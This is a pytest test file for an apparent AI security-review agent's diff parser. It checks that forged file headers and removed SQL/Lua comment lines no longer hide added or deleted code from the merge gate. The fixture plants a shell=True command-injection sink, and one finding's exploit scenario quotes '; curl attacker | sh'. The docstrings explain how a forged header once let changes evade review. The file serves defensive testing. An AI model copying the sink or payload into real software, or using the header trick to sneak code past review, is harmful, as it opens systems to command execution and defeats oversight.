"""Half of a diff is text an author wrote, and the parser read all of it.

`changed_lines` decided which lines a change is answerable for by scanning for
lines that *look like* diff headers. Inside a hunk, what a line looks like is
the author's choice: a file that adds

    ++ b/src/decoy.py

is emitted by git as `+++ b/src/decoy.py`, which the parser read as "a new file
starts here". Every addition after it — including the rest of that same hunk and
every later hunk of the same file — was recorded against a file that does not
exist. The file actually being changed lost them, so a finding on the code the
author added is attributed to neither the additions nor the deletions, which is
how a weakness that was *already there* is recorded, and pre-existing findings do
not block.

The same reading dropped deletions: a removed line beginning `-- ` arrives as
`--- ...` and was skipped as an old-file header. `--` opens a comment in SQL,
Lua, Haskell and Ada, so that one needed no attacker at all.

The fix is structural. Every line of a hunk body carries a marker column, so
column zero belongs to the diff and `+++ `/`--- ` are read only outside a hunk
body — where an author's text cannot reach.
"""

from __future__ import annotations

import subprocess

import pytest

from security_agent.config import Config, GitLabContext
from security_agent.evidence import attribution, changed_lines
from security_agent.gate import EXIT_FINDINGS, decide
from security_agent.models import ScanOutcome
from security_agent.tools import REPORT_FINDING, Session, dispatch
from security_agent.workspace import Workspace

SINK = "return subprocess.run(user_input, shell=True)"

# The added block. Everything between the forged header and the sink exists to
# put the sink out of `ADDITION_SLACK`'s reach of the one addition the old
# parser still credited to this file — otherwise the attribution survives the
# bug by accident and the test proves nothing.
BEFORE = '''\
import subprocess


def handler(user_input):
    return None
'''

AFTER = '''\
import subprocess

HELP = """
++ b/src/decoy.py
usage: app [options]

  -v   verbose
  -q   quiet
  -h   this text
"""


def handler(user_input):
    {}
'''.format(SINK)


def _git(root, *args):
    subprocess.run(("git", "-C", str(root), *args), check=True, capture_output=True)


@pytest.fixture
def repo(tmp_path):
    """A change that adds a forged file header and a command injection below it."""
    root = tmp_path / "repo"
    (root / "src").mkdir(parents=True)
    subprocess.run(("git", "init", "-q", str(root)), check=True, capture_output=True)
    _git(root, "config", "user.email", "t@example.com")
    _git(root, "config", "user.name", "T")
    (root / "src" / "app.py").write_text(BEFORE, encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "base")
    base = subprocess.run(
        ("git", "-C", str(root), "rev-parse", "HEAD"),
        capture_output=True, text=True, check=True).stdout.strip()
    (root / "src" / "app.py").write_text(AFTER, encoding="utf-8")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "change")
    return Workspace(root=root, diff_base=base, diff_head="HEAD")


def _sink_line() -> int:
    return AFTER.splitlines().index("    " + SINK) + 1


class TestForgedFileHeader:
    def test_no_file_appears_that_the_change_never_touched(self, repo):
        """The forged name must not become a key. It is a file the repository
        does not contain, and every line credited to it is a line taken away
        from the file that really changed."""
        assert "src/decoy.py" not in repo.changed_line_map().files()

    def test_the_added_sink_belongs_to_the_change(self, repo):
        """The step that decided the gate. `""` means "already there", and a
        pre-existing finding does not block by default — so an author could
        exempt their own added code by writing two characters at the start of a
        line."""
        where = attribution("src/app.py", _sink_line(), 1, repo.changed_line_map())

        assert where == "added"

    def test_the_whole_chain_still_blocks_the_merge(self, repo):
        """Git to exit code, through the tool the model actually calls.

        The intermediate assertions above all passed at some point on code that
        let this through: the defect lives between them, in which file the
        additions were filed under.
        """
        session = Session()
        result = dispatch(repo, session, REPORT_FINDING, {
            "title": "Command injection in handler",
            "severity": "high", "confidence": "high", "category": "injection",
            "file": "src/app.py", "line": _sink_line(), "evidence": SINK,
            "description": "User input is passed to a shell.",
            "exploit_scenario": "A caller sends `; curl attacker | sh`.",
            "recommendation": "Pass an argument list and do not use a shell.",
        })
        assert not result.is_error
        candidate = session.candidates[0]
        assert candidate.in_changed_lines, "the added sink was filed as pre-existing"

        outcome = ScanOutcome(mode="diff")
        outcome.reported = [candidate]

        decision = decide(Config(gitlab=GitLabContext()), outcome)

        assert decision.exit_code == EXIT_FINDINGS

    def test_a_later_hunk_of_the_same_file_is_not_lost_either(self, repo):
        """The forged header outlived the hunk it sat in: `current` stayed
        pointed at the invented file until the next real header, so a change
        with a second hunk lost that one too."""
        added = repo.changed_line_map().added["src/app.py"]

        # The injected block near the top, and the sink far below it.
        assert min(added) < 6 and max(added) == _sink_line()


class TestDeletionsThatLookLikeHeaders:
    """`-- ` at the start of a removed line is a comment in SQL, Lua, Haskell
    and Ada — and was read as an old-file header and dropped. The removal map is
    what the removed-control rule reads, so a deletion missing from it is a
    guard that was never seen to be taken away."""

    def test_a_removed_sql_comment_line_is_recorded(self):
        """Two removals in one change, one of which looked like a header.

        Written as two hunks on purpose: a `-- ` line deleted *beside* an
        ordinary one anchors to the same place, so losing it changes no answer
        and proves nothing. These sit apart, and only one of them survived.
        """
        diff = (
            "diff --git a/db/policy.sql b/db/policy.sql\n"
            "--- a/db/policy.sql\n"
            "+++ b/db/policy.sql\n"
            "@@ -4,1 +4,0 @@ CREATE POLICY tenant_isolation\n"
            # The file's own line is `-- +migrate StatementBegin`; the diff's
            # marker column makes it three dashes.
            "--- +migrate StatementBegin\n"
            "@@ -20,1 +19,0 @@ COMMIT;\n"
            "-ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;\n"
        )

        assert changed_lines(diff).removed_at["db/policy.sql"] == {4, 19}

    def test_a_removed_comment_is_the_only_deletion_and_still_attributes(self):
        """The case where losing it changes the answer: nothing else in the
        hunk is deleted, so the map is empty and the code below the removal
        comes out pre-existing."""
        diff = (
            "diff --git a/policy.lua b/policy.lua\n"
            "--- a/policy.lua\n"
            "+++ b/policy.lua\n"
            "@@ -9,1 +9,0 @@ local function proxy(req)\n"
            # The file's line is `-- verify_signature(req) -- do not remove`.
            "--- verify_signature(req) -- do not remove\n"
        )
        changed = changed_lines(diff)

        assert changed.removed_at["policy.lua"] == {9}
        assert attribution("policy.lua", 11, 1, changed) == "deleted"

    def test_a_real_old_file_header_is_still_not_a_deletion(self):
        """The control. Outside a hunk, `--- a/x` is what it says it is, and
        counting it would put a phantom deletion at the top of every file."""
        diff = ("diff --git a/x.py b/x.py\n--- a/x.py\n+++ b/x.py\n"
                "@@ -1,1 +1,1 @@\n-old\n+new_value_here\n")
        changed = changed_lines(diff)

        assert changed.removed_at["x.py"] == {1}
        assert changed.added["x.py"] == {1}
